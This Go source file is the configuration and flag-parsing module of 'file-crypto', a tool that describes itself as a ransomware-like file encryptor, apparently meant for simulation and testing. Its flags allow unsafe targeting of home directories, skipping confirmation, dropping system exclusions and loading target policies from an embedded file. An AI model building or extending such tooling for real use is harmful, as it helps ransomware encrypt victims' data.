package config

import (
	"flag"
	"fmt"
	"os"
	"runtime"
	"strings"

	"file-crypto/pkg/policy"
)

// String defaults are overrideable at build time via -ldflags -X
// Example: -ldflags "-X 'file-crypto/pkg/config.DefaultEnableCompressionStr=false'"
var (
	DefaultTargetDirStr         = "./test"
	DefaultKeyFileStr           = "decryption_key.txt"
	DefaultMaxWorkersStr        = "" // empty -> runtime.NumCPU()
	DefaultEnableCompressionStr = "true"
	DefaultBenchmarkStr         = "false"
	DefaultSystemExclusionsStr  = "true"
	DefaultOptimizedIOStr       = "true"
	DefaultDynamicWorkersStr    = "true"
	DefaultBufferSizeStr        = "65536" // bytes
	DefaultShowHelpStr          = "false"
	DefaultVerboseStr           = "false"
	DefaultUnsafeModeStr        = "false"
	DefaultAssumeYesStr         = "false"
	DefaultQuietStr             = "false"
	DefaultDryRunStr            = "false"
	DefaultIncludeGlobsStr      = ""
	DefaultExcludeGlobsStr      = ""
	DefaultMinSizeBytesStr      = "0"
	DefaultMaxSizeBytesStr      = "0"
	DefaultPolicyPathStr        = ""
	DefaultSimulationModeStr    = "false"
)

type Config struct {
	TargetDir         string
	KeyFile           string
	MaxWorkers        int
	EnableCompression bool
	Benchmark         bool
	SystemExclusions  bool
	OptimizedIO       bool
	DynamicWorkers    bool
	BufferSize        int
	ShowHelp          bool
	Verbose           bool
	UnsafeMode        bool // New: Allow running on dangerous directories
	AssumeYes         bool // New: Skip confirmation prompts (-y / -yes)
	Quiet             bool
	DryRun            bool
	IncludeGlobs      string
	ExcludeGlobs      string
	MinSizeBytes      int64
	MaxSizeBytes      int64
	PolicyPath        string
	PolicyName        string
	Simulation        bool
	ActivePolicy      *policy.Policy
}

func DefaultConfig() *Config {
	maxWorkers := parseIntOr(DefaultMaxWorkersStr, runtime.NumCPU())
	if maxWorkers <= 0 {
		maxWorkers = runtime.NumCPU()
	}

	bufferSize := parseIntOr(DefaultBufferSizeStr, 64*1024)
	if bufferSize <= 0 {
		bufferSize = 64 * 1024
	}

	return &Config{
		TargetDir:         orString(DefaultTargetDirStr, "./test"),
		KeyFile:           orString(DefaultKeyFileStr, "decryption_key.txt"),
		MaxWorkers:        maxWorkers,
		EnableCompression: parseBoolOr(DefaultEnableCompressionStr, true),
		Benchmark:         parseBoolOr(DefaultBenchmarkStr, false),
		SystemExclusions:  parseBoolOr(DefaultSystemExclusionsStr, true),
		OptimizedIO:       parseBoolOr(DefaultOptimizedIOStr, true),
		DynamicWorkers:    parseBoolOr(DefaultDynamicWorkersStr, true),
		BufferSize:        bufferSize, // bytes
		ShowHelp:          parseBoolOr(DefaultShowHelpStr, false),
		Verbose:           parseBoolOr(DefaultVerboseStr, false),
		UnsafeMode:        parseBoolOr(DefaultUnsafeModeStr, false),
		AssumeYes:         parseBoolOr(DefaultAssumeYesStr, false),
		Quiet:             parseBoolOr(DefaultQuietStr, false),
		DryRun:            parseBoolOr(DefaultDryRunStr, false),
		IncludeGlobs:      orString(DefaultIncludeGlobsStr, ""),
		ExcludeGlobs:      orString(DefaultExcludeGlobsStr, ""),
		MinSizeBytes:      parseInt64Or(DefaultMinSizeBytesStr, 0),
		MaxSizeBytes:      parseInt64Or(DefaultMaxSizeBytesStr, 0),
		PolicyPath:        orString(DefaultPolicyPathStr, ""),
		Simulation:        parseBoolOr(DefaultSimulationModeStr, false),
	}
}

func ParseFlags(appName string) (*Config, error) {
	config := DefaultConfig()

	flag.StringVar(&config.TargetDir, "dir", config.TargetDir, "Target directory to process")
	flag.StringVar(&config.KeyFile, "key", config.KeyFile, "Path to encryption key file")
	flag.IntVar(&config.MaxWorkers, "workers", config.MaxWorkers, "Maximum number of worker goroutines")
	flag.BoolVar(&config.EnableCompression, "compression", config.EnableCompression, "Enable LZ4 compression")
	flag.BoolVar(&config.Benchmark, "benchmark", config.Benchmark, "Enable benchmark mode with I/O speed measurement")
	flag.BoolVar(&config.SystemExclusions, "system-exclusions", config.SystemExclusions, "Enable system file exclusions")
	flag.BoolVar(&config.OptimizedIO, "optimized-io", config.OptimizedIO, "Enable optimized I/O with buffering")
	flag.BoolVar(&config.DynamicWorkers, "dynamic-workers", config.DynamicWorkers, "Enable dynamic worker pool sizing")
	flag.IntVar(&config.BufferSize, "buffer-size", config.BufferSize, "I/O buffer size in bytes")
	flag.BoolVar(&config.Verbose, "verbose", config.Verbose, "Enable verbose output")
	flag.BoolVar(&config.ShowHelp, "help", config.ShowHelp, "Show help message")
	flag.BoolVar(&config.UnsafeMode, "unsafe", config.UnsafeMode, "⚠️  UNSAFE: Allow running on system directories (RANSOMWARE-LIKE)")
	flag.BoolVar(&config.Quiet, "quiet", config.Quiet, "Suppress non-error output")
	flag.BoolVar(&config.DryRun, "dry-run", config.DryRun, "Preview operations without modifying files")
	flag.StringVar(&config.IncludeGlobs, "include", config.IncludeGlobs, "Comma-separated glob patterns to include")
	flag.StringVar(&config.ExcludeGlobs, "exclude", config.ExcludeGlobs, "Comma-separated glob patterns to exclude")
	flag.Int64Var(&config.MinSizeBytes, "min-size", config.MinSizeBytes, "Minimum file size to process in bytes")
	flag.Int64Var(&config.MaxSizeBytes, "max-size", config.MaxSizeBytes, "Maximum file size to process in bytes (0 for unlimited)")
	flag.StringVar(&config.PolicyPath, "policy", config.PolicyPath, "Path to policy YAML for scoped simulations")
	flag.BoolVar(&config.Simulation, "simulation", config.Simulation, "Enable simulation features (drops decryptor/private key)")

	// Confirmation skipping
	flag.BoolVar(&config.AssumeYes, "yes", config.AssumeYes, "Assume yes; skip confirmation prompts")
	flag.BoolVar(&config.AssumeYes, "y", config.AssumeYes, "Assume yes; skip confirmation prompts (alias)")

	// Handle special flags for disabling features (similar to Python version)
	var noCompression, noSystemExclusions, noOptimizedIO, noDynamicWorkers, maxPerformance bool
	flag.BoolVar(&noCompression, "no-compression", false, "Disable compression")
	flag.BoolVar(&noSystemExclusions, "no-system-exclusions", false, "Disable system file exclusions")
	flag.BoolVar(&noOptimizedIO, "no-optimized-io", false, "Disable optimized I/O")
	flag.BoolVar(&noDynamicWorkers, "no-dynamic-workers", false, "Disable dynamic worker sizing")
	flag.BoolVar(&maxPerformance, "max-performance", false, "Disable all optimizations for maximum performance")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", appName)
		fmt.Fprintf(os.Stderr, "\nA high-performance ransomware-like file encryption tool.\n\n")
		fmt.Fprintf(os.Stderr, "⚠️  WARNING: This tool aggressively encrypts user data like ransomware!\n")
		fmt.Fprintf(os.Stderr, "Only critical system files are protected to keep the OS bootable.\n\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s -dir ./documents -benchmark\n", appName)
		fmt.Fprintf(os.Stderr, "  %s -dir /home/user -unsafe -verbose    # DANGEROUS!\n", appName)
		fmt.Fprintf(os.Stderr, "  %s -dir /Users/john -unsafe -benchmark # VERY DANGEROUS!\n", appName)
		fmt.Fprintf(os.Stderr, "  %s -max-performance -dir /path/to/files\n", appName)
		fmt.Fprintf(os.Stderr, "\n⚠️  UNSAFE MODE:\n")
		fmt.Fprintf(os.Stderr, "  --unsafe allows running on system directories like /home, /Users, etc.\n")
		fmt.Fprintf(os.Stderr, "  This mimics ransomware behavior - use only for testing/backup purposes!\n")
	}

	flag.Parse()

	if config.ShowHelp {
		flag.Usage()
		os.Exit(0)
	}

	// Apply disable flags
	if noCompression {
		config.EnableCompression = false
	}
	if noSystemExclusions {
		config.SystemExclusions = false
	}
	if noOptimizedIO {
		config.OptimizedIO = false
	}
	if noDynamicWorkers {
		config.DynamicWorkers = false
	}
	if maxPerformance {
		config.EnableCompression = false
		config.SystemExclusions = false
		config.OptimizedIO = false
		config.DynamicWorkers = false
	}

	// Load policy (CLI path has priority, otherwise embedded definition)
	var loadedPolicy *policy.Policy
	if config.PolicyPath != "" {
		loaded, err := policy.LoadFile(config.PolicyPath)
		if err != nil {
			return nil, err
		}
		loadedPolicy = loaded
	} else if policy.HasEmbedded() {
		loaded, err := policy.LoadEmbedded()
		if err != nil {
			return nil, err
		}
		loadedPolicy = loaded
	}

	if loadedPolicy != nil {
		config.applyPolicy(loadedPolicy)
		config.ActivePolicy = loadedPolicy
		config.PolicyName = loadedPolicy.Name
		if config.PolicyPath == "" {
			config.PolicyPath = loadedPolicy.Source
		}
	}

	// Validate configuration
	if err := config.Validate(); err != nil {
		return nil, err
	}

	return config, nil
}

func (c *Config) Validate() error {
	if c.TargetDir == "" {
		return fmt.Errorf("target directory cannot be empty")
	}

	if c.MaxWorkers <= 0 {
		return fmt.Errorf("max workers must be greater than 0")
	}

	if c.BufferSize <= 0 {
		return fmt.Errorf("buffer size must be greater than 0")
	}

	if c.MinSizeBytes < 0 {
		return fmt.Errorf("min size must be >= 0")
	}

	if c.MaxSizeBytes < 0 {
		return fmt.Errorf("max size must be >= 0")
	}

	if c.MaxSizeBytes > 0 && c.MinSizeBytes > c.MaxSizeBytes {
		return fmt.Errorf("min size cannot exceed max size")
	}

	// Check if target directory exists
	if _, err := os.Stat(c.TargetDir); os.IsNotExist(err) {
		return fmt.Errorf("target directory does not exist: %s", c.TargetDir)
	}

	return nil
}

func (c *Config) applyPolicy(pol *policy.Policy) {
	if pol.TargetDir != "" {
		c.TargetDir = expandPolicyPath(pol.TargetDir)
	}
	if len(pol.Include) > 0 {
		c.IncludeGlobs = strings.Join(pol.Include, ",")
	} else {
		c.IncludeGlobs = ""
	}
	if len(pol.Exclude) > 0 {
		c.ExcludeGlobs = strings.Join(pol.Exclude, ",")
	}
	if pol.MinSize > 0 {
		c.MinSizeBytes = pol.MinSize
	}
	if pol.MaxSize > 0 {
		c.MaxSizeBytes = pol.MaxSize
	}
	if pol.SystemExcl != nil {
		c.SystemExclusions = *pol.SystemExcl
	}
	if pol.Unsafe != nil {
		c.UnsafeMode = *pol.Unsafe
	}
	if pol.Compression != nil {
		c.EnableCompression = *pol.Compression
	}
	if pol.DryRun != nil {
		c.DryRun = *pol.DryRun
	}
	if pol.AssumeYes != nil {
		c.AssumeYes = *pol.AssumeYes
	}
	if pol.Simulation.Enabled {
		c.Simulation = true
	}
}

func expandPolicyPath(value string) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return trimmed
	}
	if home, err := os.UserHomeDir(); err == nil {
		trimmed = strings.ReplaceAll(trimmed, "{{HOME}}", home)
	}
	return os.ExpandEnv(trimmed)
}

func (c *Config) PrintConfig(appName string) {
	fmt.Printf("🔧 %s Configuration\n", appName)
	fmt.Println(strings.Repeat("=", 50))
	fmt.Printf("📁 Target Directory: %s\n", c.TargetDir)
	fmt.Printf("🔑 Key File: %s\n", c.KeyFile)
	fmt.Printf("⚡ Workers: %d (%s)\n", c.MaxWorkers, map[bool]string{true: "Dynamic", false: "Fixed"}[c.DynamicWorkers])
	fmt.Printf("📦 Compression: %s\n", map[bool]string{true: "Enabled", false: "Disabled"}[c.EnableCompression])
	fmt.Printf("🚫 System Exclusions: %s\n", map[bool]string{true: "Enabled", false: "Disabled"}[c.SystemExclusions])
	fmt.Printf("💾 Optimized I/O: %s\n", map[bool]string{true: "Enabled", false: "Disabled"}[c.OptimizedIO])
	fmt.Printf("📊 Buffer Size: %d KB\n", c.BufferSize/1024)
	if c.PolicyName != "" {
		fmt.Printf("📝 Policy: %s (%s)\n", c.PolicyName, c.PolicyPath)
	} else if c.PolicyPath != "" {
		fmt.Printf("📝 Policy: %s\n", c.PolicyPath)
	}
	if c.Simulation {
		fmt.Println("🎯 Simulation mode: ENABLED (drops decryptor/private key)")
	}
	if c.UnsafeMode {
		fmt.Printf("⚠️  UNSAFE MODE: %s\n", map[bool]string{true: "ENABLED - Can run on system directories!", false: "Disabled"}[c.UnsafeMode])
	}
	if c.Benchmark {
		fmt.Println("📊 Benchmark mode: I/O speed measurement enabled")
	}
	fmt.Printf("💻 Platform: %s/%s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Printf("🧮 CPU Cores: %d\n", runtime.NumCPU())
}

// Helpers for parsing ldflag-provided strings
func parseBoolOr(val string, fallback bool) bool {
	switch strings.ToLower(strings.TrimSpace(val)) {
	case "1", "t", "true", "y", "yes", "on":
		return true
	case "0", "f", "false", "n", "no", "off":
		return false
	default:
		return fallback
	}
}

func parseIntOr(val string, fallback int) int {
	s := strings.TrimSpace(val)
	if s == "" {
		return fallback
	}
	sign := 1
	idx := 0
	if s[0] == '-' {
		sign = -1
		idx = 1
	}
	n := 0
	for ; idx < len(s); idx++ {
		ch := s[idx]
		if ch < '0' || ch > '9' {
			return fallback
		}
		n = n*10 + int(ch-'0')
	}
	return sign * n
}

func parseInt64Or(val string, fallback int64) int64 {
	s := strings.TrimSpace(val)
	if s == "" {
		return fallback
	}
	sign := int64(1)
	idx := 0
	if s[0] == '-' {
		sign = -1
		idx = 1
	}
	var n int64
	for ; idx < len(s); idx++ {
		ch := s[idx]
		if ch < '0' || ch > '9' {
			return fallback
		}
		n = n*10 + int64(ch-'0')
	}
	return sign * n
}

func orString(val string, fallback string) string {
	s := strings.TrimSpace(val)
	if s == "" {
		return fallback
	}
	return s
}
